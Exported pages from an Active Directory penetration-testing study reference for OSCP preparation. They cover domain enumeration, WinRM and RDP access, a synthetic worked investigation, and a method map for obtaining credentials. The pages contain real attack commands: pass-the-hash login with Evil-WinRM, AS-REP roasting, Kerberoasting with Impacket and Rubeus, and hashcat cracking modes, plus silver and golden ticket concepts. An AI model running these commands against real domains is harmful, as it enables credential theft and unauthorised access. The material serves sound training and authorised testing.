6.2.1.3.1 Expected — raw evidence **Command/view:** net user USER /domain ```text User name analyst Account active Yes Global Group memberships *Domain Users The command completed successfully. ``` **Decisive clue:** Global Group memberships: Domain Users. **Supported:** An ordinary account and one displayed membership are visible. **Still missing:** Nested/primary memberships and useful object/host rights are not established. **Next check:** [§6.2.5.1 — Enumerate and validate effective object permissions](acl.md#s-6-2-5-1)
6.2.1.3.2 Interesting — raw evidence **Command/view:** net user USER /domain ```text User name analyst Account active Yes Global Group memberships *Domain Users *Support The command completed successfully. ``` **Decisive clue:** The additional Support membership. **Supported:** A custom group is worth tracing into an exact right. **Still missing:** The name Support does not identify what it can administer. **Next check:** [§6.2.5.1 — Enumerate and validate effective object permissions](acl.md#s-6-2-5-1)
6.2.1.3.3 Failed / inconclusive — raw evidence **Command/view:** net user /domain ```text System error 1355 has occurred. The specified domain either does not exist or could not be contacted. ``` **Decisive clue:** The domain-query dependency failed. **Supported:** This command did not establish a directory user list. **Still missing:** Domain context, DC discovery, DNS and route need checking; no account-password conclusion follows. **Next check:** [§6.1.1.1 — Establish the current identity and domain](context.md#s-6-1-1-1)
**Normalized observations:** the following is a synthetic interpretation example, not literal output from one command. Placeholder ciphers and secrets are deliberately unusable. ```text User name: svc_reports Account active: Yes Global Group memberships: *Domain Users *Reporting Operators Group: Reporting Operators Members: svc_reports, analyst ``` | Interpreted result | What it establishes | Required next check | Continue at | | --- | --- | --- | --- | | svc_reports | A discovered enabled account; its name suggests a purpose only. | Inspect its SPNs, effective groups and any documented object/host rights. | [§6.2.4.1 — Enumerate service accounts and SPNs](spns.md#s-6-2-4-1) | | Reporting Operators | A custom group shared with the controlled user. | Determine what this group can access or modify; the name does not establish admin. | [§6.2.5.1 — Enumerate and validate effective object permissions](acl.md#s-6-2-5-1) | | Get-ADUser is not recognized | RSAT is absent or not loaded. | Use native commands, ADSI, PowerView or authenticated LDAP. | [§6.2.1.1 — Baseline enumeration — users and groups](users.md#s-6-2-1-1) | **Stop when:** Selected accounts, memberships and the next useful right are identified; unexplained names remain leads. **Revisit only when:** A new identity or changed membership reveals different effective access. ## 6.2.1.4 Decide and continue | Result | Decision | Next numbered section | | --- | --- | --- | | Enabled after validation | A membership reaches a useful right: validate that right on the exact target. | [§6.2.5.1 — Enumerate and validate effective object permissions](acl.md#s-6-2-5-1) | | Ruled out in this context | A selected group has no relevant access in this context: continue another lead. | [§6.2.2.1 — Enumerate shares, SYSVOL and NETLOGON](shares.md#s-6-2-2-1) | | Inconclusive / failed check | Membership is partial or a query is denied: retain the gap; do not record the group as empty. | [§6.2.1.1 — Baseline enumeration — users and groups](users.md#s-6-2-1-1) | ## 6.2.1.5 Tooling and complete procedure net.exe is the Windows baseline. RSAT Get-AD* is an optional structured alternative; ADSI/LDAP/PowerView fallbacks are in the owning procedure. The commands above are extracts from the owning procedure; Windows-host and Kali/target tool availability must be checked in that environment. No installation or target execution is implied by this page. [Open the owning procedure, prerequisites and complete variants](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/06-ad-lateral-movement/01-domain-mapping.md#3-native-windows-baseline). [Study mechanisms and alternatives](../methods/ad-mapping.md). [Shared concepts](../Master_Notes.md). [§6.6.2 — Choose an approach](method-choice.md).

pages.title: 6.4.2 Access using WinRM or RDP
pages.markdown: # 6.4.2 Access using WinRM or RDP [AD cheatsheet](../../cheatsheets/active-directory.md) | [§6 — AD Notes](README.md) | [§6.5.3 — Read output](read-output.md) A compatible credential, reachable target listener and the service-specific endpoint/logon right. Windows-domain naming and Kerberos requirements still apply. **Where to look:** For WinRM inspect endpoint availability and authorization; for RDP inspect remote-interactive logon rights, group/policy, NLA and credential-mode support. Use the complete RDP procedure for FreeRDP variants. **Expected behavior / secure boundary:** A WinRM or RDP listener is not a grant of access. Non-admin remote-management access can be intentionally delegated. A remote WinRM session may lack a usable onward credential context even when the first hop succeeds. These commands are study references for a later scoped exercise. Replace placeholders for the selected environment; the output below is synthetic, not a recorded target result. Commands that collect secrets, request tickets, create sessions or change directory state require their stated prerequisites. ## 6.4.2.1 WinRM credential and transport variants > **Run:** Kali / Linux with Evil-WinRM. **Requires:** Compatible material, reachable WinRM listener and endpoint authorization. **Effect:** Creates a remote command session; target commands can change state. ### 6.4.2.1.1 Password; omit -p to prompt where supported ```bash # Password; omit -p to prompt where supported evil-winrm -i TARGET_HOST -u USER -p 'PASSWORD' ``` ### 6.4.2.1.2 NT hash ```bash # NT hash evil-winrm -i TARGET_HOST -u USER -H NT_HASH ``` ### 6.4.2.1.3 HTTPS listener ```bash # HTTPS listener evil-winrm -i TARGET_HOST -u USER -p 'PASSWORD' -S -P 5986 ``` ## 6.4.2.2 WinRM using native WinRS > **Run:** Windows with WinRS. **Requires:** Reachable authorized WinRM endpoint and selected network credentials. **Effect:** Executes the selected remote identity/host verification command. ```cmd winrs /r:TARGET_HOST /u:DOMAIN\USER /p:PASSWORD "cmd /c hostname & whoami" ``` **What this checks:** Evil-WinRM and WinRS are different clients to WinRM. Their credential modes and platform requirements differ. A password/hash example must match the material; the full procedure also documents ticket and HTTPS variants. ## 6.4.2.3 Interpret the output **Normalized observations:** the following is a synthetic interpretation example, not literal output from one command. Placeholder ciphers and secrets are deliberately unusable. ```text WinRM: authentication succeeds Command: whoami -> EXAMPLE\analyst Onward access to \\FS01\Finance: access denied RDP: requested logon type not granted ``` | Interpreted result | What it establishes | Required next check | Continue at | | --- | --- | --- | --- | | whoami on target | The session executed as the displayed identity. | Verify host/token and re-enumerate from that state. | [§6.5.2.1 — Re-enumerate after an identity or host change](reenumerate.md#s-6-5-2-1) | | Onward share denied | Could be second-hop credential context or share authorization. | Inspect the network identity and service rights; do not invalidate the first hop. | [§6.5.1.1 — Diagnose the failed boundary](failure.md#s-6-5-1-1) | | RDP logon type denied | A service-specific policy boundary. | Check remote-interactive rights/deny policies or choose another authorized service. | [§6.4.1.1 — Select a compatible remote-access mechanism](movement.md#s-6-4-1-1) | **Stop when:** First-hop identity/host and the tested endpoint result are verified. **Revisit only when:** Endpoint policy, logon rights or onward network credential context changes. ## 6.4.2.4 Decide and continue | Result | Decision | Next numbered section | | --- | --- | --- | | Enabled after validation | A session is established: verify host, token and network identity, then re-enumerate. | [§6.5.2.1 — Re-enumerate after an identity or host change](reenumerate.md#s-6-5-2-1) | | Ruled out in this context | An endpoint explicitly denies the needed logon: rule out that service/context until new evidence. | [§6.4.1.1 — Select a compatible remote-access mechanism](movement.md#s-6-4-1-1) | | Inconclusive / failed check | TLS/NLA/listener errors: diagnose the protocol layer before changing credentials. | [§6.5.1.1 — Diagnose the failed boundary](failure.md#s-6-5-1-1) | ## 6.4.2.5 Tooling and complete procedure Evil-WinRM on Kali; WinRS/PowerShell remoting on Windows; FreeRDP for RDP. The detailed page retains credential-mode and version-specific variants. The commands above are extracts from the owning procedure; Windows-host and Kali/target tool availability must be checked in that environment. No installation or target execution is implied by this page. [Open the owning procedure, prerequisites and complete variants](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/06-ad-lateral-movement/05-lateral-movement.md#6-winrm-winrs-and-powershell-remoting). [Study mechanisms and alternatives](../methods/lateral-movement.md). [Shared concepts](../Master_Notes.md). [§6.6.2 — Choose an approach](method-choice.md).

pages.title: 6.6.3 One continuous worked AD investigation
pages.markdown: # 6.6.3 One continuous worked AD investigation [§6 — Chapter 6](README.md) | [6.6 Study aids](chapter-6-6.md) This is one continuous hypothetical investigation. The objective is a verified new host-access capability, not an invented domain-compromise result. All names and observations are synthetic; commands remain references for the later practice phase. ## 6.6.3.1 Starting state and first question Assume a supplied low-privilege EXAMPLE\analyst identity and a usable domain query route. Verify the token/network identity and domain/DC context. The account is a member of Support; the group name is not an administrative right. [§6.1.1.1 — Establish the current identity and domain](context.md#s-6-1-1-1) [§6.2.1.1 — Baseline enumeration — users and groups](users.md#s-6-2-1-1) ## 6.6.3.2 A readable file creates a scoped lead SYSVOL is readable. A selected logon script names FS01\Finance. This proves a readable reference, not Finance access. Add the host/share to the investigation map, establish scope/address and test the selected operation with the current identity. [§6.2.2.1 — Enumerate shares, SYSVOL and NETLOGON](shares.md#s-6-2-2-1) [§6.2.6.1 — Validate host-specific access rights](hosts.md#s-6-2-6-1) ## 6.6.3.3 Dead end: listing did not grant the wanted read SMB authenticates and lists Finance, but the selected configuration file is denied. Keep the valid identity and listing evidence. Close the claim that its contents or credentials are known. Do not repeat the denied read unchanged; return only after a relevant identity/right change. [§6.5.1.1 — Diagnose the failed boundary](failure.md#s-6-5-1-1) ## 6.6.3.4 A service clue does not settle the attack An SPN identifies svc_reports on DB01. Its useful rights and password feasibility are unknown. Record the account/service relationship, then rank it against stronger existing evidence; do not request every ticket merely because a service registration exists. [§6.2.4.1 — Enumerate service accounts and SPNs](spns.md#s-6-2-4-1) ## 6.6.3.5 Validate a graph edge manually A graph suggests Support can add a member to Helpdesk and Helpdesk has a useful APP01 remote-management relationship. Check the controlled membership, the group member-write operation/GUID, scope and applicable deny rules. Separately validate what Helpdesk enables on APP01 and whether its endpoint is reachable. [§6.2.5.1 — Enumerate and validate effective object permissions](acl.md#s-6-2-5-1) [§6.4.1.1 — Select a compatible remote-access mechanism](movement.md#s-6-4-1-1) ## 6.6.3.6 Paper transition and verification For this worked example only, assume all conditions are verified and the scoped practice authorization allows the specific group change. The canonical procedure supplies the exact modification and restoration steps. A successful directory change is not yet a fresh token or a remote session. Refresh the relevant authentication context and test the intended endpoint; verify host and whoami output after a session is established. [§6.3.7.1 — Choose a permission-backed identity transition](object-change.md#s-6-3-7-1) [§6.4.2.1 — Access using WinRM or RDP](winrm.md#s-6-4-2-1) ## 6.6.3.7 New state, new questions The synthetic session now verifies analyst on APP01. Re-enumerate the token, relevant readable configuration, object/host rights and routes from that state. An onward share denial may concern a second-hop credential context; it does not erase the verified first hop. No higher privilege, accessible LSASS material or domain administration is assumed. [§6.5.2.1 — Re-enumerate after an identity or host change](reenumerate.md#s-6-5-2-1) ## 6.6.3.8 Why the route changed | Observation | Supported decision | Revisit condition | | --- | --- | --- | | Finance file read denied | Preserve auth/listing; close that read hypothesis | New relevant identity or file permission | | SPN found, account value unknown | Keep as a ranked candidate | Useful rights or justified recovery feasibility | | Effective group control plus useful host relationship | Validate the smallest identity/host transition | Current memberships, scope and endpoint authorization | | New verified APP01 session | Re-enumerate from the new state | Another identity, privilege, host or route change |

pages.title: Gain a more useful domain identity
pages.markdown:
# Gain a more useful domain identity [Strategy map](../Attack_Strategy_Map.md) | [Master Notes](../Master_Notes.md) | [Operational index](../../README.md) | [Cheatsheets](../../cheatsheets/README.md) Choose a credential source or object transition by its prerequisites. Track the exact account, credential type and compatible service after every transition. Conditional AD CS/delegation/GPO branches require their own complete enabling chain. **Speedrun blocks:** 11; credential classification in 5. **Documented methods:** 18. Examples are hypothetical study material. Apply commands only to an assigned scope during the later practice phase. A method is enabled by its prerequisites; its presence here does not establish a vulnerability or practical mastery. ## First pass: tools and findings Use the branch matching the current host, identity and observed result. Tool output supplies leads; the linked procedure verifies and uses the exact condition. ### Inspect the tickets/material already available Use the current identity and ticket cache before attempting credential collection or ticket construction. ```cmd klist ``` - **If A valid service-scoped ticket:** Check service principal, expiry and the matching client. → [Classify tickets and use a compatible cache](credentials.md#ticket-use). - **If A privileged local token and an accessible credential source:** Check protection and exact source prerequisites before selecting a collector. → [Obtain accessible live logon-session credential material](ad-identities.md#ad-lsass). - **Otherwise:** No useful ticket/source: inspect account configuration and object rights with the available domain identity. → [Enumerate directory objects with native, LDAP and PowerView approaches](ad-mapping.md#domain-directory). ### Choose AS-REP or SPN roasting from account evidence Use this branch only for a confirmed preauthentication-disabled account; ordinary SPN accounts use a different request. ```bash impacket-GetNPUsers 'DOMAIN/USER' -no-pass -dc-ip DC_IP ``` - **If A valid AS-REP response for the known account:** Use the type-specific offline recovery path. → [Request AS-REP material for an account without preauthentication](ad-identities.md#kerberos-asrep). - **If A normal service account with an SPN:** Request the matching service ticket in an authenticated context. → [Request a selected service ticket for offline service-account recovery](ad-identities.md#kerberos-roast). - **Otherwise:** The account requires preauthentication: stop this path and inspect SPNs or effective object rights. → [Validate effective directory-object control](ad-mapping.md#domain-acl). ### Resolve an ACL edge to its concrete operation Use the exact trustee, target class, GUID and inheritance/deny behavior, not the graph label alone. ```powershell Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs ``` - **If Effective password-reset right on the intended user:** Confirm account state and the effect of changing its password. → [Reset a target account password through a validated directory right](ad-identities.md#ad-password-reset). - **If Effective write to a useful group's member attribute:** Confirm the group effect and refresh the resulting token/logon context. → [Add a controlled identity to a group through effective membership rights](ad-identities.md#ad-group-control). - **If WriteOwner/WriteDacl on the target object:** Preserve original state and validate each intermediate right. → [Convert ownership or DACL control into a narrower useful right](ad-identities.md#ad-owner-dacl). - **Otherwise:** The right is not effective for the controlled principal: discard that edge and inspect another verified relationship. → [Enumerate directory objects with native, LDAP and PowerView approaches](ad-mapping.md#domain-directory). ## Discovery workflow Start from a mapped object/right, an available ticket, or a host whose current privilege may expose a credential source. Follow these observations into a method; the detailed recognition routes below show synthetic output and the checks still needed. 1. Inspect existing tickets and host privilege/protection before invasive collection: [Inventory, convert and import tickets in the correct logon context](ad-identities.md#kerberos-tickets); [Obtain accessible live logon-session credential material](ad-identities.md#ad-lsass). 2. Choose matched local credential sources and classify what each produces: [Extract local account hashes from matched SAM and SYSTEM](ad-identities.md#ad-sam); [Extract LSA secrets and cached-domain verifiers](ad-identities.md#ad-security); [Use Credential Manager and DPAPI with the protecting context](ad-identities.md#ad-dpapi); [Parse an offline domain database or select a justified remote collection path](ad-identities.md#ad-ntds). 3. Discover the actual account flag or SPN before choosing a roast path: [Request AS-REP material for an account without preauthentication](ad-identities.md#kerberos-asrep); [Request a selected service ticket for offline service-account recovery](ad-identities.md#kerberos-roast); [Create a temporary SPN through an effective object right](ad-identities.md#ad-targeted-roast). 4. Resolve the exact ACE and object before password, group, DACL or replication transitions: [Reset a target account password through a validated directory right](ad-identities.md#ad-password-reset); [Add a controlled identity to a group through effective membership rights](ad-identities.md#ad-group-control); [Convert ownership or DACL control into a narrower useful right](ad-identities.md#ad-owner-dacl); [Use validated directory replication rights for bounded credential proof](ad-identities.md#ad-dcsync). 5. Expand certificate, delegation or GPO paths only when their specific configuration evidence exists: [Conditional: validate an AD CS enrollment-to-authentication path](ad-identities.md#ad-certificates); [Conditional: use a validated delegation or RBCD relationship](ad-identities.md#ad-delegation); [Conditional: trace GPO control to privileged policy consumption](ad-identities.md#ad-gpo). PowerView examples require a reviewed compatible script in the current authenticated directory context. Check the loaded copy rather than mixing legacy/fork parameter names; the directory-mapping entry includes native, ADSI and LDAP alternatives. ```powershell Import-Module .\PowerView.ps1 Get-Command -Module PowerView ``` **Decision rule:** an observed clue opens a candidate. Choose it only after the missing conditions are verified; a failed check rules out that context, while unavailable evidence stays inconclusive. ## Method families - **Host credential sources:** [Obtain accessible live logon-session credential material](#ad-lsass), [Extract local account hashes from matched SAM and SYSTEM](#ad-sam), [Extract LSA secrets and cached-domain verifiers](#ad-security), [Use Credential Manager and DPAPI with the protecting context](#ad-dpapi), [Parse an offline domain database or select a justified remote collection path](#ad-ntds). - **Password-derived ticket recovery:** [Request AS-REP material for an account without preauthentication](#kerberos-asrep), [Request a selected service ticket for offline service-account recovery](#kerberos-roast), [Create a temporary SPN through an effective object right](#ad-targeted-roast). - **Ticket capabilities:** [Inventory, convert and import tickets in the correct logon context](#kerberos-tickets), [Forge a service-scoped ticket from the correct service key](#kerberos-silver). - **Object-backed identity changes and replication:** [Reset a target account password through a validated directory right](#ad-password-reset), [Add a controlled identity to a group through effective membership rights](#ad-group-control), [Convert ownership or DACL control into a narrower useful right](#ad-owner-dacl), [Use validated directory replication rights for bounded credential proof](#ad-dcsync). - **Conditional policy, delegation and certificate paths:** [Conditional: trace GPO control to privileged policy consumption](#ad-gpo), [Conditional: use a validated delegation or RBCD relationship](#ad-delegation), [Conditional: validate an AD CS enrollment-to-authentication path](#ad-certificates), [Conditional: understand a realm-wide TGT forgery from KRBTGT material](#kerberos-golden). ## Choose a method | Method | Recognition clue | Required access | Enabling conditions | Resulting capability | | --- | --- | --- | --- | --- | | [Obtain accessible live logon-session credential material](#ad-lsass) | A controlled Windows host may hold useful logged-on identities | A domain identity, appropriate host privilege, or a validated effective directory-object right | Required process/host privileges, useful sessions and compatible architecture; PPL/Credential Guard/protection may prevent access or remove material | Typed password/hash/key/ticket artifacts from accessible logon sessions | | [Extract local account hashes from matched SAM and SYSTEM](#ad-sam) | Protected local registry material is available under sufficient host privilege | A domain identity, appropriate host privilege, or a validated effective directory-object right | Matched SAM/SYSTEM from the same system and appropriate read/backup access | Local-account NT hashes with source-machine context | | [Extract LSA secrets and cached-domain verifiers](#ad-security) | Matched SECURITY/SYSTEM material is accessible | A domain identity, appropriate host privilege, or a validated effective directory-object right | Appropriate host/read privilege and complete matching key/source files | Typed LSA secrets, machine/service credentials or cached logon verifiers | | [Use Credential Manager and DPAPI with the protecting context](#ad-dpapi) | Saved credentials or protected application blobs/master keys | A domain identity, appropriate host privilege, or a validated effective directory-object right | Access to the protected data plus matching user/machine context, master-key material or an appropriate recovery factor | A usable saved-credential operation or decrypted secret for a defined identity | | [Parse an offline domain database or select a justified remote collection path](#ad-ntds) | An already controlled DC or a validated privileged domain collection context | A domain identity, appropriate host privilege, or a validated effective directory-object right | Matched NTDS/SYSTEM for offline parsing, or the specific remote protocol/host/replication rights required by the chosen method | Domain credential material with a recorded source and collection mechanism | | [Request AS-REP material for an account without preauthentication](#kerberos-asrep) | A known user or directory flag indicates Kerberos preauthentication is disabled | A known domain username for a password-free request, or an authenticated bind for directory-backed discovery | Account with preauthentication disabled, KDC reachability and a supported returned encryption type; no-password and authenticated-discovery contexts differ | A correctly formatted offline password-recovery artifact | | [Request a selected service ticket for offline service-account recovery](#kerberos-roast) | A user-owned SPN and a useful service-account relationship | A domain identity, appropriate host privilege, or a validated effective directory-object right | A valid domain authentication/TGT context, reachable KDC, target SPN and a feasible password/encryption candidate strategy | A selected TGS recovery artifact and possibly a recovered service-account password | | [Create a temporary SPN through an effective object right](#ad-targeted-roast) | A controlled principal can write a user's servicePrincipalName | A domain identity, appropriate host privilege, or a validated effective directory-object right | Effective SPN-property right, compatible account, unique temporary SPN, authenticated TGS request and exact cleanup | A recovery artifact for the controlled target account | | [Inventory, convert and import tickets in the correct logon context](#kerberos-tickets) | A valid ticket/cache or a long-term key that can request a TGT | A domain identity, appropriate host privilege, or a validated effective directory-object right | Matching client/realm/service, valid lifetime, compatible format and available KDC/service routes; ticket import affects a specific context | A verified Kerberos service capability or key-to-TGT identity transition | | [Forge a service-scoped ticket from the correct service key](#kerberos-silver) | A service account key and a concrete compatible service/SPN objective | A domain identity, appropriate host privilege, or a validated effective directory-object right | Correct service key/encryption type, domain SID, principal/SPN data and service validation behavior; modern PAC/KDC validation can constrain use | A verified authentication effect limited to the compatible service context | | [Reset a target account password through a validated directory right](#ad-password-reset) | A controlled trustee has the effective password-reset right on a useful account | A domain identity, appropriate host privilege, or a validated effective directory-object right | Exact object/right and account state; the disruptive password change is justified within the assigned lab objective | A new known credential for the target identity | | [Add a controlled identity to a group through effective membership rights](#ad-group-control) | A group member-attribute write or equivalent effective right | A domain identity, appropriate host privilege, or a validated effective directory-object right | Exact target group, controlled principal, useful resulting right and a fresh token/logon context | A verified new group-based authorization capability | | [Convert ownership or DACL control into a narrower useful right](#ad-owner-dacl) | Effective WriteOwner or WriteDacl on a useful directory object | A domain identity, appropriate host privilege, or a validated effective directory-object right | Correct object/ACE semantics, permission to perform the required intermediate change and a preserved original ACL/owner | A verified specific right enabling another identity transition | | [Use validated directory replication rights for bounded credential proof](#ad-dcsync) | A principal has the relevant effective replication rights at the domain naming context | A domain identity, appropriate host privilege, or a validated effective directory-object right | Required replication extended rights, DC RPC connectivity and correct domain identity; access to a member server is insufficient | Selected domain credential material retrieved through directory replication | | [Conditional: trace GPO control to privileged policy consumption](#ad-gpo) | A useful linked GPO has a potentially controllable directory or SYSVOL component | A domain identity, appropriate host privilege, or a validated effective directory-object right | Effective rights on the necessary GPO components, applicable target scope/filtering, writable policy artifact and a privileged refresh trigger | A verified policy-backed privileged action on an in-scope host | | [Conditional: use a validated delegation or RBCD relationship](#ad-delegation) | Delegation configuration or computer-object write suggests a Kerberos impersonation path | A domain identity, appropriate host privilege, or a validated effective directory-object right | Exact delegation type; required service/machine identity and key; allowed target/SPN; account flags and KDC policy permit the flow | A service-scoped impersonation ticket accepted by the intended destination | | [Conditional: validate an AD CS enrollment-to-authentication path](#ad-certificates) | A CA/template configuration exposes a plausible certificate identity transition | A domain identity, appropriate host privilege, or a validated effective directory-object right | Effective enrollment/template/CA rights and the exact vulnerable settings; issuance requirements, identity mapping and authentication route must all permit the path | An issued certificate/private-key capability that authenticates as the intended identity | | [Conditional: understand a realm-wide TGT forgery from KRBTGT material](#kerberos-golden) | An already compromised domain exposes a KRBTGT key and domain SID | A domain identity, appropriate host privilege, or a validated effective directory-object right | Request permission does not equal service administration, and strong machine/account keys can make recovery infeasible. ### 6. Execute and choose variants ##### Why Kerberoasting works Any valid domain identity can normally request a service ticket for an SPN. The ticket is encrypted with key material belonging to the SPN account, allowing offline password guessing. ```text VALID DOMAIN IDENTITY + SPN ACCOUNT + KDC ROUTE -> TGS-REP CIPHER -> OFFLINE GUESSING -> SERVICE-ACCOUNT PASSWORD IF A CANDIDATE VERIFIES ``` Rank SPN accounts before requesting tickets: group/ACL value, service/host, account type, password age, enabled state and resulting access matter more than collecting every ticket. ##### Enumerate without requesting tickets ```bash impacket-GetUserSPNs -dc-ip DC_IP 'DOMAIN/USER' ``` ```cmd Rubeus.exe kerberoast /stats /domain:DOMAIN /dc:DC_HOST ``` ##### Request one selected user ```bash impacket-GetUserSPNs -request-user TARGET_USER -dc-ip DC_IP \ -outputfile kerberoast-TARGET_USER.hashes 'DOMAIN/USER' ``` ```cmd Rubeus.exe kerberoast /user:TARGET_USER /domain:DOMAIN /dc:DC_HOST /outfile:kerberoast.hashes ```
Request all mapped candidates ```bash impacket-GetUserSPNs -request -dc-ip DC_IP \ -outputfile kerberoast.hashes 'DOMAIN/USER' ``` ```cmd Rubeus.exe kerberoast /domain:DOMAIN /dc:DC_HOST /outfile:kerberoast.hashes ``` Use broad requests only when scope and the candidate inventory justify them. Prefer one ranked account during verification.
##### Hash type and cracking | Prefix | Kerberos etype | Hashcat mode | | --- | ---: | ---: | | `$krb5tgs$23$` | RC4-HMAC | 13100 | | `$krb5tgs$17$` | AES128 | 19600 | | `$krb5tgs$18$` | AES256 | 19700 | ```bash hashcat -m 13100 kerberoast.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule hashcat -m 19600 kerberoast-aes128.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule hashcat -m 19700 kerberoast-aes256.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule hashcat -m MODE HASH_FILE --show ``` Select the mode from the actual prefix and current `hashcat --example-hashes`; do not assume every TGS is RC4. AES material is still an offline verifier but generally costs more per guess. Cracking feasibility is governed mainly by password strength and candidates, not merely ticket acquisition. ##### Common failures - no SPNs returned: wrong domain/base/authentication context, filtering or no user SPNs; - `KDC_ERR_S_PRINCIPAL_UNKNOWN`: SPN is absent/malformed or queried in the wrong realm; - `KDC_ERR_ETYPE_NOSUPP`: requested cipher conflicts with account/domain policy; - output wraps or fails to load: save directly to an output file and verify prefix/line integrity; - crack exhausts candidates: password not represented by the tested model; the account is not therefore “secure.” ### 7. A recovered password is still validated and mapped as a new identity. If the effective right permits writing `servicePrincipalName` on a user, add a unique temporary SPN, request that account's ticket and remove the SPN immediately. Why it works A silver ticket is encrypted for a service account rather than issued through a new domain TGT. Execute and choose variants > **Prerequisite:** key/hash of the account encrypting the target SPN's tickets, domain SID, exact SPN/service/host, a plausible existing domain identity and compatible target-service validation behavior. Important boundaries: - the key must belong to the account that owns the SPN; machine-account keys commonly protect host services; - the ticket is limited to the named service/host and whichever services share the same account key; - current PAC enforcement means using a nonexistent identity can fail; use a real authorized test identity and validate behavior; - a service may perform KDC/PAC validation or additional authorization; - a successfully imported ticket is not successful service access. Golden tickets require the KRBTGT key and domain SID and create a forged TGT. They are a high-impact persistence concept covered in the [conditional domain-compromise section](../../reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise.md#conditional-high-impact-ticket-forging-concepts), not a default Block 11 action. ### 7.
